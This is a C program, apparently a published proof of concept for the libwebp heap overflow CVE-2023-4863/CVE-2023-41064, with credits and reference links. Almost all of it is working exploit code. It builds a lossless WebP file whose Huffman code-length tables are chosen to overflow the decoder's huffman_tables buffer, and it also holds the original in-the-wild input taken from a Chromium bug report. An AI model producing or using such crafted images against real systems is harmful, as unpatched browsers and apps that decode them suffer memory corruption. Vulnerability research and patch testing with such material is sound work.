#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <assert.h>
#include <malloc.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>

//CVE-2023-4863/CVE-2023-41064
//author: @mistymtncop
//author: @benhawkes
//main insight was discovered by Ben Hawkes (@benhawkes)
//he discovered the right code_lengths!

//Thanks to @ROPsicle for fixing a double increment bug!

//https://blog.isosceles.com/the-webp-0day/
//https://github.com/honzasp/vp8l
//https://developers.google.com/speed/webp/docs/riff_container
//https://fgiesen.wordpress.com/2018/02/19/reading-bits-in-far-too-many-ways-part-1/
//https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a
//https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art007
//https://chromium.googlesource.com/webm/libwebp/+/refs/tags/v1.2.1/doc/webp-lossless-bitstream-spec.txt
//https://developers.google.com/speed/webp/gallery2
//https://github.com/webmproject/libwebp/blob/main/doc/building.md
//https://www.ietf.org/id/draft-zern-webp-12.html
//https://guide.handmadehero.org/code/day455/

#define ARRAY_COUNT(a) (sizeof(a)/sizeof(a[0]))

typedef uint64_t vp8l_atype_t;
typedef uint32_t vp8l_wtype_t;
#define HToLE32(x) (x)
#define WSWAP HToLE32
#define VP8L_WRITER_BYTES    4   // sizeof(vp8l_wtype_t)
#define VP8L_WRITER_BITS     32  // 8 * sizeof(vp8l_wtype_t)
#define VP8L_WRITER_MAX_BITS 64  // 8 * sizeof(vp8l_atype_t)
#define MIN_EXTRA_SIZE  (32768ULL)

#define MAX_ALLOWED_CODE_LENGTH      15
#define HUFFMAN_CODES_PER_META_CODE  5
#define MAX_CACHE_BITS               11

#define WebPSafeMalloc calloc //lol
#define WebPSafeFree free //lol

typedef uint32_t CodeLenCountsArr[HUFFMAN_CODES_PER_META_CODE][MAX_ALLOWED_CODE_LENGTH + 1];

typedef struct {
    size_t capacity;
    size_t size;
    uint8_t *buffer;
} Arena;

Arena temp_arena = {0};

void init_arena(Arena *arena, uint8_t *buffer, size_t capacity) {
    memset(arena, 0, sizeof(*arena));
    arena->capacity = capacity;
    arena->buffer = buffer;
}

void reset_arena(Arena *arena) {
    arena->size = 0;
}

void *push_size(Arena *arena, size_t size) {
    size_t remaining = arena->capacity - arena->size;
    assert(size <= remaining);
    uint8_t *result = &arena->buffer[arena->size];
    memset(result, 0, size);
    arena->size += size;
    return result;
}

void *push_array_(Arena *arena, size_t count, size_t type_size) {
    size_t size = count * type_size; //integer overflow!
    void *result = push_size(arena, size);
    return result;
}

#define push_array(arena, count, type) (type*) push_array_(arena, count, sizeof(type)) 

 

typedef struct {
    vp8l_atype_t bits_;   // bit accumulator
    int          used_;   // number of bits used in accumulator
    uint8_t*     buf_;    // start of buffer
    uint8_t*     cur_;    // current write position
    uint8_t*     end_;    // end of buffer
    
    // After all bits are written (VP8LBitWriterFinish()), the caller must observe
    // the state of error_. A value of 1 indicates that a memory allocation
    // failure has happened during bit writing. A value of 0 indicates successful
    // writing of bits.
    int error_;
} VP8LBitWriter;

int CheckSizeOverflow(uint64_t size) {
    return size == (size_t)size;
}

uint32_t BSwap32(uint32_t x) {
    return (x >> 24) | ((x >> 8) & 0xff00) | ((x << 8) & 0xff0000) | (x << 24);
}


static int VP8LBitWriterResize(VP8LBitWriter* bw, size_t extra_size) {
    uint8_t* allocated_buf;
    size_t allocated_size;
    const size_t max_bytes = bw->end_ - bw->buf_;
    const size_t current_size = bw->cur_ - bw->buf_;
    const uint64_t size_required_64b = (uint64_t)current_size + extra_size;
    const size_t size_required = (size_t)size_required_64b;
    if (size_required != size_required_64b) {
        bw->error_ = 1;
        return 0;
    }
    if (max_bytes > 0 && size_required <= max_bytes) return 1;
    allocated_size = (3 * max_bytes) >> 1;
    if (allocated_size < size_required) allocated_size = size_required;
    // make allocated size multiple of 1k
    allocated_size = (((allocated_size >> 10) + 1) << 10);
    allocated_buf = (uint8_t*)WebPSafeMalloc(1ULL, allocated_size);
    if (allocated_buf == NULL) {
        bw->error_ = 1;
        return 0;
    }
    if (current_size > 0) {
        memcpy(allocated_buf, bw->buf_, current_size);
    }
    WebPSafeFree(bw->buf_);
    bw->buf_ = allocated_buf;
    bw->cur_ = bw->buf_ + current_size;
    bw->end_ = bw->buf_ + allocated_size;
    return 1;
}

int VP8LBitWriterInit(VP8LBitWriter* bw, size_t expected_size) {
    memset(bw, 0, sizeof(*bw));
    return VP8LBitWriterResize(bw, expected_size);
}

void VP8LPutBitsFlushBits(VP8LBitWriter* bw) {
    // If needed, make some room by flushing some bits out.
    if (bw->cur_ + VP8L_WRITER_BYTES > bw->end_) {
        const uint64_t extra_size = (bw->end_ - bw->buf_) + MIN_EXTRA_SIZE;
        if (!CheckSizeOverflow(extra_size) ||
                !VP8LBitWriterResize(bw, (size_t)extra_size)) {
            bw->cur_ = bw->buf_;
            bw->error_ = 1;
            return;
        }
    }
    *(vp8l_wtype_t*)bw->cur_ = (vp8l_wtype_t)WSWAP((vp8l_wtype_t)bw->bits_);
    bw->cur_ += VP8L_WRITER_BYTES;
    bw->bits_ >>= VP8L_WRITER_BITS;
    bw->used_ -= VP8L_WRITER_BITS;
}

void VP8LPutBits(VP8LBitWriter* bw, uint32_t bits, int n_bits) {
    if (n_bits > 0) {
        if (bw->used_ >= 32) {
            VP8LPutBitsFlushBits(bw);
        }
        bw->bits_ |= (vp8l_atype_t)bits << bw->used_;
        bw->used_ += n_bits;
    }
}

uint8_t* VP8LBitWriterFinish(VP8LBitWriter* bw) {
  // flush leftover bits
    if (VP8LBitWriterResize(bw, (bw->used_ + 7) >> 3)) {
        while (bw->used_ > 0) {
            *bw->cur_++ = (uint8_t)bw->bits_;
            bw->bits_ >>= 8;
            bw->used_ -= 8;
        }
        bw->used_ = 0;
    }
    return bw->buf_;
}

size_t VP8LBitWriterNumBytes(VP8LBitWriter* bw) {
    return (bw->cur_ - bw->buf_) + ((bw->used_ + 7) >> 3);
}

void VP8LBitWriterWipeOut(VP8LBitWriter* bw) {
    if (bw != NULL) {
        WebPSafeFree(bw->buf_);
        memset(bw, 0, sizeof(*bw));
    }
}

#pragma pack(push, 1)

typedef struct { 
    uint8_t riff_magic[4];
    uint32_t riff_size;
    uint8_t webp_magic[4];
    uint8_t vp8l_magic[4];
    uint32_t vp8l_size;
} RiffHeader;
#pragma pack(pop)

RiffHeader make_riff_header(size_t riff_size, size_t vp8l_size) {
    RiffHeader result = {0};
    result.riff_size = riff_size;
    result.vp8l_size = vp8l_size;
    
    memcpy(&result.riff_magic, "RIFF", 4);
    memcpy(&result.webp_magic, "WEBP", 4);
    memcpy(&result.vp8l_magic, "VP8L", 4);

    return result;
}


static const uint8_t kReversedBits[16] = {
    0x0, 0x8, 0x4, 0xc, 0x2, 0xa, 0x6, 0xe,
    0x1, 0x9, 0x5, 0xd, 0x3, 0xb, 0x7, 0xf
};

static uint32_t ReverseBits(int num_bits, uint32_t bits) {
    uint32_t retval = 0;
    int i = 0;
    while (i < num_bits) {
        i += 4;
        retval |= kReversedBits[bits & 0xf] << (MAX_ALLOWED_CODE_LENGTH + 1 - i);
        bits >>= 4;
    }
    retval >>= (MAX_ALLOWED_CODE_LENGTH + 1 - num_bits);
    return retval;
}

static void ConvertBitDepthsToSymbols(uint32_t* code_lengths, int len, uint32_t *codes) {
    // 0 bit-depth means that the symbol does not exist.
    uint32_t next_code[MAX_ALLOWED_CODE_LENGTH + 1] = {0};
    int depth_count[MAX_ALLOWED_CODE_LENGTH + 1] = {0};

    for (int i = 0; i < len; ++i) {
        const int code_length = code_lengths[i];
        assert(code_length <= MAX_ALLOWED_CODE_LENGTH);
        ++depth_count[code_length];
    }
    depth_count[0] = 0;    // ignore unused symbol
    next_code[0] = 0;
    {
        uint32_t code = 0;
        for (int i = 1; i <= MAX_ALLOWED_CODE_LENGTH; ++i) {
            code = (code + depth_count[i - 1]) << 1;
            next_code[i] = code;
        }
    }
    for (int i = 0; i < len; ++i) {
        const int code_length = code_lengths[i];
        codes[i] = ReverseBits(code_length, next_code[code_length]++);
    }
}


//In-place calculation of minimum-redundancy codes. (Alistair Moffat and Jyrki Katajainen)
//doi:10.1007/3-540-60220-8_79
//https://github.com/madler/brotli/blob/master/huff.c (credit to Mark Adler)
void calculate_code_lengths(uint32_t* histogram, uint32_t count) {
    //assert(count > 2);
    uint32_t *arr = histogram;
    if (count == 0) {
        return;
    }
    if (count == 1) {
        arr[0] = 0;
        return;
    }

    // first pass, left to right, setting parent pointers
    arr[0] += arr[1];
    uint32_t root = 0;             // next root node to be used
    uint32_t leaf = 2;             // next leaf to be used
    uint32_t next = 1;             // next value to be assigned
    for(; next < count - 1; next++) {
        // select first item for a pairing
        if (leaf >= count || (/*root < next &&*/ arr[root] < arr[leaf])) {
            arr[next] = arr[root];
            arr[root++] = next;
        } else {
            arr[next] = arr[leaf++];
        }
        // add on the second item
        if (leaf >= count || (root < next && arr[root] < arr[leaf])) {
            arr[next] += arr[root];
            arr[root++] = next;
        } else {
            arr[next] += arr[leaf++];
        }
    }
    {
        arr[count-2] = 0;
        for(uint32_t next = count-2; next != 0; next--) {
            arr[next-1] = arr[arr[next-1]] + 1;
        }
        
        uint32_t available = 1;
        
        uint32_t depth = 0;
        uint32_t root = count-1;
        uint32_t next = count-1;
        while(available != 0) {
            uint32_t used = 0;
            while(root != 0 && arr[root-1] == depth) {
                used += 1;
                root -= 1;
            }
            while(available > used) {
                arr[next] = depth;
                next -= 1;
                available -= 1;
            }
            available = 2*used;
            depth += 1;
        }
    }
}


typedef struct {
    uint32_t count;
    uint32_t index;
} HistUnit;

typedef struct {
    HistUnit *hist;
    uint32_t symbol_count;
} Histogram;


int compare(const void *a, const void *b) {
    HistUnit* h_a = (HistUnit*)a;
    HistUnit* h_b = (HistUnit*)b;
    
    return h_a->count - h_b->count;
}

typedef struct {
    uint32_t *code_lengths;
    uint32_t *codes;
    uint32_t symbol_count;
} HuffmanTable;

HuffmanTable make_huffman_table(Arena *arena, uint32_t symbol_count) {
    HuffmanTable result = {0};
    result.symbol_count = symbol_count;
    result.code_lengths = push_array(arena, symbol_count, uint32_t);
    result.codes = push_array(arena, symbol_count, uint32_t);

    return result;
}

Histogram calc_histogram_u8(Arena *arena, uint32_t symbol_count, uint8_t* input, size_t size) {
    Histogram result = {0};
    result.symbol_count = symbol_count;
    
    result.hist = push_array(arena, result.symbol_count, HistUnit);

    for(uint32_t i = 0; i < result.symbol_count; i++) {
        result.hist[i].index = i;
    }
    for(int i = 0; i < size; i++) {
        uint8_t val = input[i];
        result.hist[val].count += 1;
    }
    return result;
}

Histogram calc_histogram_u32(Arena *arena, uint32_t symbol_count, uint32_t* input, size_t count) {
    Histogram result = {0};
    result.symbol_count = symbol_count;
    
    result.hist = push_array(arena, result.symbol_count, HistUnit);

    for(uint32_t i = 0; i < result.symbol_count; i++) {
        result.hist[i].index = i;
    }
    for(int i = 0; i < count; i++) {
        uint32_t val = input[i];
        assert(val < result.symbol_count);
        result.hist[val].count += 1;
    }
    return result;
}

HuffmanTable build_huffman_table(Arena *arena, Histogram *histogram) {
    HuffmanTable result = make_huffman_table(arena, histogram->symbol_count);

    HistUnit *hist = histogram->hist;
    qsort(hist, histogram->symbol_count, sizeof(hist[0]), compare);
    
    uint32_t *freqs = push_array(arena, histogram->symbol_count, uint32_t);
    uint32_t zero_count = 0;
    for(uint32_t i = 0; i < histogram->symbol_count; i++) {
        if(hist[i].count != 0) 
            break;
        zero_count++;
    }
    uint32_t freq_count = histogram->symbol_count - zero_count;
    
    for(uint32_t i = zero_count; i < histogram->symbol_count; i++) {
        uint32_t freq = hist[i].count;
        freqs[i] = freq;
    }
    calculate_code_lengths(&freqs[zero_count], freq_count);
    
    uint32_t *bit_depths_sorted = freqs;
    
    for(uint32_t i = 0; i < histogram->symbol_count; i++) {
        uint32_t sorted_i = hist[i].index;
        result.code_lengths[sorted_i] = bit_depths_sorted[i];
    }
    ConvertBitDepthsToSymbols(result.code_lengths, histogram->symbol_count, result.codes);

    return result;
}


void write_symbol(HuffmanTable *table, VP8LBitWriter* bw, uint8_t sym) {
    assert(sym < table->symbol_count);
    VP8LPutBits(bw, table->codes[sym], table->code_lengths[sym]);
}

void write_code_lengths(Arena *arena, VP8LBitWriter* bw, uint32_t* code_lengths, size_t symbol_count) {
    Histogram code_lengths_hist = calc_histogram_u32(
            arena, symbol_count, code_lengths, symbol_count);
    HuffmanTable table = build_huffman_table(arena, &code_lengths_hist);
    
    #define CODE_LENGTH_CODES            19
    assert(CODE_LENGTH_CODES <= table.symbol_count);
    static const uint8_t kStorageOrder[CODE_LENGTH_CODES] = {
        17, 18, 0, 1, 2, 3, 4, 5, 16, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15
    };
    int codes_to_store = CODE_LENGTH_CODES;
    for (; codes_to_store > 4; --codes_to_store) {
        if (table.code_lengths[kStorageOrder[codes_to_store - 1]] != 0) {
            break;
        }
    }
    
    //ReadHuffmanCode
    //--------------------------
    VP8LPutBits(bw, 0, 1); //simple_code
    
    //code_length_code_lengths
    VP8LPutBits(bw, codes_to_store - 4, 4);
    for(int i = 0; i < codes_to_store; i++) {
        VP8LPutBits(bw, table.code_lengths[kStorageOrder[i]], 3);
    }
    
    //ReadHuffmanCodeLengths
    //---------------------------
    VP8LPutBits(bw, 0, 1); //use length
    
    //write code lengths
    for(int i = 0; i < symbol_count; i++) {
        uint32_t code_length = code_lengths[i];
        write_symbol(&table, bw, code_length);
    }
}

void write_header(VP8LBitWriter* bw, int width, int height, bool has_alpha) {
    VP8LPutBits(bw, 0x2f, 8); // signature
    VP8LPutBits(bw, width - 1, 14);
    VP8LPutBits(bw, height - 1, 14);
    VP8LPutBits(bw, has_alpha ? 1 : 0, 1);
    VP8LPutBits(bw, 0, 3); // version 0
}


void build_webp_data(VP8LBitWriter *bw, uint32_t color_cache_bits, CodeLenCountsArr code_lengths_counts) {
    write_header(bw, 1, 1, false);
    
    //DecodeImageStream
    //-----------------------
    VP8LPutBits(bw, 0, 1); // ReadTransform
    
    assert(color_cache_bits >= 0 && color_cache_bits <= MAX_CACHE_BITS);
    VP8LPutBits(bw, (color_cache_bits > 0), 1); // Color cache
    if(color_cache_bits > 0) {
        VP8LPutBits(bw, color_cache_bits, 4);
    }
    
    //ReadHuffmanCodes
    //-----------------------
    VP8LPutBits(bw, 0, 1);   // if (allow_recursion && VP8LReadBits(br, 1))    
    
    static uint32_t kAlphabetSize[HUFFMAN_CODES_PER_META_CODE] = {280, 256, 256, 256, 40};
    
    for(int i = 0; i < HUFFMAN_CODES_PER_META_CODE; i++) {
        reset_arena(&temp_arena);
        uint32_t alphabet_size = kAlphabetSize[i];
        if(i == 0 && color_cache_bits > 0) {
            alphabet_size += (1 << color_cache_bits);
        }
        uint32_t *code_lengths = push_array(&temp_arena, alphabet_size, uint32_t);
        uint32_t write = 0;
        uint32_t total = 0;
        for(int len = 0; len <= MAX_ALLOWED_CODE_LENGTH; len++) {
            int repeat_count = code_lengths_counts[i][len];
            for(int r = 0; r < repeat_count; r++) {
                code_lengths[write++] = len;
            }
            total += repeat_count;
        }
        assert(write <= alphabet_size);
        write_code_lengths(&temp_arena, bw, code_lengths, alphabet_size);
    }
    
    VP8LBitWriterFinish(bw);
}
    
void craft_webp(char *filename, uint32_t color_cache_bits, CodeLenCountsArr code_lengths_counts) {
    VP8LBitWriter bw_ = {0};   
    VP8LBitWriter* bw = &bw_;
    VP8LBitWriterInit(bw, 0x1000);

    build_webp_data(bw, color_cache_bits, code_lengths_counts);
    size_t webpll_size = VP8LBitWriterNumBytes(bw);
    size_t pad = webpll_size & 1;
    size_t riff_size = 12 + webpll_size + pad;

    RiffHeader riff_hdr = make_riff_header(riff_size, webpll_size);
    
    FILE *file_out = fopen(filename, "wb");
    fwrite(&riff_hdr, sizeof(riff_hdr), 1, file_out);
    fwrite(bw->buf_, webpll_size, 1, file_out);
    if(pad != 0) {
        uint8_t one_byte[1] = {0};
        fwrite(one_byte, 1, 1, file_out); //stupid hack
    }
    fclose(file_out);
    VP8LBitWriterWipeOut(bw);
}

int main(int argc, char **argv) {
    char *filename = 0;
    if(argc == 2) {
        filename = argv[1];
    } else {
        printf("USAGE: craft bad.webp");
        return 0;
    }
    
    size_t temp_buffer_size = 0x10000;
    uint8_t* temp_buffer = malloc(temp_buffer_size);
    
    init_arena(&temp_arena, temp_buffer, temp_buffer_size);

#if 1
    //color_cache_bits parameters allows us to add an extra pow2 to the first huffman table.

    uint32_t color_cache_bits = 0;
    //for color_cache_bits (0) size of huffman_tables buffer = 654 + 630 + 630 + 630 + 410 = 2954 elements
    //to overflow we just exceed this number!
    static CodeLenCountsArr code_lengths_counts = {
        //  1  2  3  4  5  6  7  8  9  10   11  12 13 14 15
        {0, 1, 1, 0, 0, 0, 0, 0, 0, 3, 229, 41,  1, 1, 1, 2},   //size = 654
        {0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241,  1,  1, 1, 1, 2},   //size = 630
        {0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241,  1,  1, 1, 1, 2},   //size = 630
        {0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241,  1,  1, 1, 1, 2},   //size = 630
        {0, 1, 1, 1, 1, 1, 0, 0, 0, 11, 5,   1, 10, 4, 2, 2},   //size = 414!!!
        //{0, 1, 1, 1, 1, 0, 1, 1, 0, 15, 5,   9,  1, 1, 1, 2}, //size = 410
    };
#else
    //NSO INPUT - from https://bugs.chromium.org/p/chromium/issues/detail?id=1479274
    uint32_t color_cache_bits = 6;
    //for color_cache_bits (6) size of huffman_tables buffer = 718 + 630 + 630 + 630 + 410 = 3018 elements
    //to overflow we just exceed this number!
    static CodeLenCountsArr code_lengths_counts = {
        //  1  2  3  4  5  6  7  8  9    10   11  12 13 14 15
        {0, 1, 0, 0, 0, 0, 0, 0, 0, 177, 154, 7,  1, 1, 1, 2}, //size = 716
        {0, 1, 0, 1, 1, 1, 0, 0, 0, 81,  85,  81, 1, 1, 1, 2}, //size = 628
        {0, 1, 0, 1, 1, 1, 0, 0, 0, 81,  85,  81, 1, 1, 1, 2}, //size = 628
        {0, 1, 0, 1, 1, 1, 0, 0, 0, 81,  85,  81, 1, 1, 1, 2}, //size = 628
        {0, 0, 0, 0, 0, 0, 3, 2, 2, 3,   12,  2,  2, 2, 0, 12} //size = 526!!!
    };
#endif
    
    
    craft_webp(filename, color_cache_bits, code_lengths_counts);
    
    return 0;
}